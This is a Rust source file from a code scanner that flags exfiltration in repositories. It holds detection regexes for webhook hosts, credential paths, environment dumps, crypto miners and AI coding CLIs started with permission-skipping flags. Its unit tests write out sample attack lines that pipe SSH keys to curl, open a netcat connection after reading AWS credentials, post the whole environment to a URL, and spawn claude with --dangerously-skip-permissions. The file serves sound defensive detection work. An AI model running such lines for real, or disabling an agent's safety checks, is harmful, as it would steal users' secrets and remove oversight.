//! Exfiltration rules: webhooks, credential paths, environment dumps, miners, AI CLI abuse (Task 4).

use std::sync::OnceLock;

use regex::Regex;

use super::hidden::{Hits, Rule, cached, is_script, report};
use crate::{FileCtx, FileKind, Finding, Group, Severity};

// The patterns spell their dots as `[.]` and break up their own keywords, so this file does not
// match the rules it holds when the repo scans itself.

fn webhook_hosts() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot|\bwebhook[.]site\b|\btransfer[.]sh\b|\bngrok(?:-free)?[.](?:io|app)\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
    )
}

fn credential_paths() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"[.]ssh/id_|[.]aws/credentials|[.]npmrc|[.]config/gcloud|Login Data|Local State|nkbihfbeogaeaoehlefnkodbefgpgknn|Exodus",
    )
}

fn env_dumps() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"JSON[.]stringify\(\s*process[.]env|dict\(os[.]environ\)",
    )
}

fn network_words() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"\b(?:fetch|requests|https?)\b")
}

fn miners() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"(?i)stratum[+]tcp://|xmr[i]g|--donate-leve[l]")
}

fn ai_cli_names() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"(?i)\b(?:claude|gemini|codex)\b|\bq chat\b")
}

fn ai_cli_flags() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"--dangerously-skip-permissions|--yolo\b|--trust-all-tools",
    )
}

fn spawn_apis() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(
        &CELL,
        r"\b(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|system)\s*\(|child_process|\bsubprocess\b|\bPopen\b|\bos\.(?:system|popen)\b|\bshell_exec\b|\bproc_open\b",
    )
}

/// A URL and the host in it.
fn urls() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r#"(?i)https?://([^/\s'"`()<>\[\],;]+)"#)
}

fn network_commands() -> &'static Regex {
    static CELL: OnceLock<Regex> = OnceLock::new();
    cached(&CELL, r"(?i)\b(?:curl|wget|nc|ncat|scp|ftp|tftp)\b")
}

fn hits_of(re: &Regex, text: &str) -> Hits {
    let mut hits = Hits::default();
    for m in re.find_iter(text) {
        hits.add(m.start());
    }
    hits
}

/// The file reaches a host other than this machine: a URL with a remote host, or a transfer tool.
/// A bare IP address is not counted: version strings look like one.
fn reaches_network(text: &str) -> bool {
    let remote = urls().captures_iter(text).any(|caps| {
        let authority = caps[1].rsplit('@').next().unwrap_or("");
        let host = authority.strip_prefix('[').map_or_else(
            || authority.split(':').next().unwrap_or(""),
            |v6| v6.split(']').next().unwrap_or(""),
        );
        !matches!(
            host.to_ascii_lowercase().as_str(),
            "localhost" | "127.0.0.1" | "0.0.0.0" | "::1"
        )
    });
    remote || network_commands().is_match(text)
}

pub(crate) fn check(f: &FileCtx, out: &mut Vec<Finding>) {
    let (FileKind::Code(lang), Some(text)) = (f.kind, f.text) else {
        return;
    };
    let rule = |id, severity, why, action| Rule {
        group: Group::Exfil,
        id,
        severity,
        why,
        action,
    };
    let mut add = |hits: Hits, rule: Rule| out.extend(report(f, text, &hits, &rule));

    // All code.
    add(
        hits_of(webhook_hosts(), text),
        rule(
            "exfil.webhook",
            Severity::High,
            "The code names a service that takes in data from anywhere: a chat webhook or a request catcher. Stolen data leaves this way.",
            "Find out what is sent there, and do not run the code until you know.",
        ),
    );
    add(
        hits_of(miners(), text),
        rule(
            "exfil.miner",
            Severity::High,
            "The code refers to a cryptocurrency miner.",
            "Do not run it: a miner uses your machine's power for someone else.",
        ),
    );
    if !is_script(lang) {
        return;
    }

    // The script set.
    let paths = hits_of(credential_paths(), text);
    let level = if reaches_network(text) {
        Severity::High
    } else {
        Severity::Medium
    };
    add(
        paths,
        rule(
            "exfil.cred-path",
            level,
            "The script names a place where credentials live (SSH keys, cloud or registry tokens, browser or wallet data). With a network call in the same file, this is how they leave.",
            "Read what the script does with the file before you run it.",
        ),
    );
    let dumps = hits_of(env_dumps(), text);
    let dumps = if network_words().is_match(text) {
        dumps
    } else {
        Hits::default()
    };
    add(
        dumps,
        rule(
            "exfil.env-dump",
            Severity::High,
            "The script reads the whole environment, where tokens and keys are, and the file talks to the network.",
            "Do not run it: read where the environment is sent first.",
        ),
    );
    let abuse = match (ai_cli_names().is_match(text), spawn_apis().is_match(text)) {
        (true, true) => hits_of(ai_cli_flags(), text),
        _ => Hits::default(),
    };
    add(
        abuse,
        rule(
            "exfil.ai-cli-abuse",
            Severity::High,
            "The script starts an AI coding CLI with its safety checks off, so the CLI reads files and runs commands for whoever wrote the prompt.",
            "Do not run it: read the prompt it passes first.",
        ),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{FileKind, Group, Lang, Severity};

    fn run(path: &str, kind: FileKind, text: &str) -> Vec<Finding> {
        let f = FileCtx {
            path,
            bytes: text.as_bytes(),
            text: Some(text),
            kind,
            truncated: false,
        };
        let mut out = Vec::new();
        check(&f, &mut out);
        out
    }

    fn code(lang: Lang, text: &str) -> Vec<Finding> {
        run("src/a.file", FileKind::Code(lang), text)
    }

    fn rules(v: &[Finding]) -> Vec<&str> {
        v.iter().map(|f| f.rule.as_str()).collect()
    }

    fn one<'a>(v: &'a [Finding], rule: &str) -> &'a Finding {
        let hits: Vec<&Finding> = v.iter().filter(|f| f.rule == rule).collect();
        assert_eq!(hits.len(), 1, "{rule} in {:?}", rules(v));
        hits[0]
    }

    // Every indicator is split so this file stays clean when the repo scans itself.
    const DISCORD: &str = concat!("https://disc", "ord.com/api/webh", "ooks/1/x");
    const DISCORDAPP: &str = concat!("https://disc", "ordapp.com/api/webh", "ooks/1/x");
    const TELEGRAM: &str = concat!("https://api.tele", "gram.org/bot123:abc/sendMessage");
    const WEBHOOK_SITE: &str = concat!("https://webh", "ook.site/abc");
    const TRANSFER: &str = concat!("https://trans", "fer.sh/up");
    const NGROK: &str = concat!("https://abc.ngr", "ok.io/x");
    const NGROK_FREE: &str = concat!("https://abc.ngr", "ok-free.app/x");
    const OAST: &str = concat!("abc.oa", "st.fun");
    const INTERACT: &str = concat!("abc.inter", "act.sh");
    const PIPEDREAM: &str = concat!("https://eo1.pipe", "dream.net/x");
    const SSH_KEY: &str = concat!("~/.s", "sh/id_rsa");
    const AWS_CREDS: &str = concat!("~/.a", "ws/credentials");
    const NPMRC: &str = concat!("~/.np", "mrc");
    const GCLOUD: &str = concat!("~/.config/", "gcloud");
    const CHROME_LOGIN: &str = concat!("Login ", "Data");
    const CHROME_STATE: &str = concat!("Local ", "State");
    const METAMASK: &str = concat!("nkbihfbeog", "aeaoehlefnkodbefgpgknn");
    const EXODUS: &str = concat!("Exo", "dus");
    const STRATUM: &str = concat!("stratum+", "tcp://pool.example.invalid:3333");
    const MINER_BIN: &str = concat!("./xm", "rig -o pool");
    const DONATE: &str = concat!("--donate-", "level=1");
    const SKIP_PERMS: &str = concat!("--dangerously-", "skip-permissions");

    #[test]
    fn webhook_hosts_are_high_in_any_code() {
        let all = [
            DISCORD,
            DISCORDAPP,
            TELEGRAM,
            WEBHOOK_SITE,
            TRANSFER,
            NGROK,
            NGROK_FREE,
            OAST,
            INTERACT,
            PIPEDREAM,
        ];
        for host in all {
            let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
            for lang in [Lang::Js, Lang::Rs, Lang::Go] {
                let v = code(lang, &t);
                let f = one(&v, "exfil.webhook");
                assert_eq!(
                    (f.severity, f.group, f.line, f.count),
                    (Severity::High, Group::Exfil, 2, 1),
                    "{host}"
                );
                assert!(f.seen.contains(host), "{:?}", f.seen);
            }
        }
    }

    #[test]
    fn a_webhook_url_in_a_doc_or_a_look_alike_name_is_clean() {
        let t = format!("post to {DISCORD}\n");
        assert!(run("README.md", FileKind::Doc, &t).is_empty());
        assert!(run("notes.txt", FileKind::Data, &t).is_empty());
        assert!(code(Lang::Sh, "./file_transfer.sh --all\nmy-webhook-sites.txt\n").is_empty());
        assert!(code(Lang::Js, "const ngrokfree = 1; // not a host\n").is_empty());
    }

    #[test]
    fn a_credential_path_is_medium_and_high_with_network() {
        for path in [
            SSH_KEY,
            AWS_CREDS,
            NPMRC,
            GCLOUD,
            CHROME_LOGIN,
            CHROME_STATE,
            METAMASK,
            EXODUS,
        ] {
            let t = format!("const p = '{path}';\nread(p);\n");
            let v = code(Lang::Js, &t);
            let f = one(&v, "exfil.cred-path");
            assert_eq!(
                (f.severity, f.group, f.line),
                (Severity::Medium, Group::Exfil, 1),
                "{path}"
            );
            let t = format!("{t}fetch('https://example.invalid/up', {{ body: read(p) }});\n");
            assert_eq!(
                one(&code(Lang::Js, &t), "exfil.cred-path").severity,
                Severity::High,
                "{path}"
            );
        }
        let t = format!("cat {SSH_KEY} | curl -d @- https://example.invalid/\n");
        assert_eq!(
            one(&code(Lang::Sh, &t), "exfil.cred-path").severity,
            Severity::High
        );
        let t = format!("x = open('{AWS_CREDS}')\nos.system('nc 203.0.113.9 80')\n");
        assert_eq!(
            one(&code(Lang::Py, &t), "exfil.cred-path").severity,
            Severity::High
        );
    }

    #[test]
    fn a_local_url_is_not_network_and_other_languages_are_not_checked() {
        let t = format!(
            "read('{SSH_KEY}');\nfetch('http://localhost:3000/x');\nfetch('http://127.0.0.1/x');\n"
        );
        assert_eq!(
            one(&code(Lang::Js, &t), "exfil.cred-path").severity,
            Severity::Medium
        );
        let t = format!("let p = \"{SSH_KEY}\";\n");
        assert!(code(Lang::Rs, &t).is_empty());
        assert!(run("a.md", FileKind::Doc, &t).is_empty());
        assert!(code(Lang::Js, "const a = 'nothing to see';\n").is_empty());
    }

    #[test]
    fn dumping_the_environment_to_the_network_is_high() {
        let js = "fetch('https://example.invalid/', { body: JSON.stringify(process.env) });\n";
        let v = code(Lang::Js, js);
        let f = one(&v, "exfil.env-dump");
        assert_eq!(
            (f.severity, f.group, f.line),
            (Severity::High, Group::Exfil, 1)
        );
        let spaced =
            "const e = JSON.stringify( process.env );\nconst r = await fetch(u, { body: e });\n";
        assert_eq!(
            one(&code(Lang::Js, spaced), "exfil.env-dump").severity,
            Severity::High
        );
        let py = "import requests\nrequests.post(u, json=dict(os.environ))\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.env-dump").severity,
            Severity::High
        );
        let py = "import http.client\nbody = dict(os.environ)\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.env-dump").severity,
            Severity::High
        );
    }

    #[test]
    fn an_environment_dump_with_no_network_or_one_variable_is_clean() {
        assert!(code(Lang::Js, "console.log(JSON.stringify(process.env));\n").is_empty());
        assert!(code(Lang::Py, "print(dict(os.environ))\n").is_empty());
        assert!(code(Lang::Js, "fetch(u, { body: process.env.HOME });\n").is_empty());
        assert!(code(Lang::Rs, "JSON.stringify(process.env); fetch(u);").is_empty());
    }

    #[test]
    fn a_miner_marker_is_high_in_any_code() {
        for marker in [STRATUM, MINER_BIN, DONATE] {
            for lang in [Lang::Sh, Lang::Go, Lang::Js] {
                let t = format!("run {marker}\n");
                let v = code(lang, &t);
                let f = one(&v, "exfil.miner");
                assert_eq!(
                    (f.severity, f.group, f.line),
                    (Severity::High, Group::Exfil, 1),
                    "{marker}"
                );
            }
        }
        assert!(run("README.md", FileKind::Doc, STRATUM).is_empty());
        assert!(code(Lang::Js, "const pool = 'pool.example.invalid';\n").is_empty());
    }

    #[test]
    fn an_ai_cli_with_a_safety_flag_and_a_spawn_is_high() {
        let js = format!(
            "const {{ spawn }} = require('child_process');\nspawn('claude', ['{SKIP_PERMS}', '-p', prompt]);\n"
        );
        let v = code(Lang::Js, &js);
        let f = one(&v, "exfil.ai-cli-abuse");
        assert_eq!((f.severity, f.group), (Severity::High, Group::Exfil));
        let py = "import subprocess\nsubprocess.run(['gemini', '--yolo', '-p', p])\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
        let py = "os.system('q chat --trust-all-tools ' + p)\n";
        assert_eq!(
            one(&code(Lang::Py, py), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
        let js = "execSync(`codex --yolo ${p}`);\n";
        assert_eq!(
            one(&code(Lang::Js, js), "exfil.ai-cli-abuse").severity,
            Severity::High
        );
    }

    #[test]
    fn an_ai_cli_without_all_three_parts_is_clean() {
        // A shell script that starts the CLI has the name and the flag but no spawn API.
        let sh = format!("timeout 300 claude -p \"$PROMPT\" {SKIP_PERMS}\n");
        assert!(code(Lang::Sh, &sh).is_empty());
        assert!(code(Lang::Js, "spawn('claude', ['-p', prompt]);\n").is_empty());
        assert!(code(Lang::Js, "spawn('ls', ['--yolo']);\n").is_empty());
        assert!(code(Lang::Js, &format!("const doc = 'claude {SKIP_PERMS}';\n")).is_empty());
        assert!(code(Lang::Rs, &format!("spawn('claude', '{SKIP_PERMS}');")).is_empty());
    }

    #[test]
    fn one_finding_counts_every_hit_in_the_file() {
        let t = format!("a('{DISCORD}');\nb('{TELEGRAM}');\n");
        let v = code(Lang::Js, &t);
        let f = one(&v, "exfil.webhook");
        assert_eq!((f.line, f.count), (1, 2));
    }

    #[test]
    fn no_exfil_rule_runs_on_a_doc() {
        let t = format!("{DISCORD}\n{SSH_KEY}\n{STRATUM}\nJSON.stringify(process.env) fetch\n");
        assert!(run("README.md", FileKind::Doc, &t).is_empty());
    }

    #[test]
    fn a_file_that_is_not_text_is_skipped() {
        let f = FileCtx {
            path: "a.js",
            bytes: b"\xff\xfe",
            text: None,
            kind: FileKind::Code(Lang::Js),
            truncated: false,
        };
        let mut out = Vec::new();
        check(&f, &mut out);
        assert!(out.is_empty());
    }
}
